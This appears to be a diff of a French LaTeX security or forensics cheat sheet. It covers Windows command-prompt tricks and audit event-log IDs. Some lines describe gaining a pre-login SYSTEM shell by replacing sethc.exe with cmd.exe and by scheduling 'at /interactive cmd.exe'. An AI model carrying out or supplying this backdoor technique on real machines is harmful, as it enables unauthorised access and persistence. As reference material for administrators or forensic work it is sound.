 	{\sl \footnotesize \color{blue}HKEY\_LOCAL\_MACHINE$\backslash$SOFTWARE$\backslash$Microsoft$\backslash$Windows$\backslash$CurrentVersion$\backslash$Uninstall$\backslash$\\
@@ -8510,7 +8655,7 @@ par : {\sl \color{blue}C:$\backslash$Windows$\backslash$system32$\backslash$cmd.
 Ex\'ecuter la commande (en rempla\c cant hh:mm par l'heure +1 minute) : {\sl \color{blue}at hh:mm /interactive cmd.exe}\\
 
 {\Large \textbf{Windows XP/Vista/Seven}}\\
-\textit{Effectuer au pr\'ealable une copie du fichier sethc.exe.}\\
+\textit{Effectuer au pr\'ealable une copie du fichier sethc.exe. Attention ces fichiers sont pr\'esents \`a plusieurs emplacements, et prot\'eg\'es par l'UAC. Il faut donc rechercher toutes les versions et les remplacer.}\\
 \textbf{Remplacement de l'utilitaire de touches r\'emanentes :} {\sl \color{blue}C:$\backslash$Windows$\backslash$system32$\backslash$sethc.exe} par {\sl \color{blue}cmd.exe}\\
 Il suffit maintenant d'appuyer 5 fois sur la fl\`eche MAJUSCULE gauche du clavier (sans \^etre connect\'e pour afficher un invite de commande DOS).
 \vskip+0.1cm
@@ -8559,7 +8704,7 @@ sc delete shellcmdline
 \url{http://www.myeventlog.com}\\
 }
 {
-Il existe deux formats de fichiers d'audit sous syst\`emes Windows : Evt (version ant'erieures \`a Vista) puis Evtx.
+Il existe deux formats de fichiers d'audit sous syst\`emes Windows : Evt (version ant\'erieures \`a Vista) puis Evtx.
 }
 {
 \textbf{Emplacement des fichiers :}
@@ -8588,7 +8733,7 @@ Il existe deux formats de fichiers d'audit sous syst\`emes Windows : Evt (versio
 < Vista&529-537&System&\'Echec d'authentification\\\hline
 < Vista&538&System&D\'econnexion d'un utilisateur\\\hline
 < Vista&517&System&Le journal d'audit a \'et\'e effac\'e.\\\hline
-< Vista&624-630, 644-647&System&Modification/cr\'eation d'un compte\\\hline
+< Vista&624-630, 644-647&System&Modification/cr\'eation d'un compte\\\hline\hline
 $\geq$ Vista & 4608 & System & D\'emarrage de Windows\\\hline
 $\geq$ Vista&4609&System&Arr\^et de Windows\\\hline
 $\geq$ Vista&4616&System&Modification de l'heure syst\`eme\\\hline
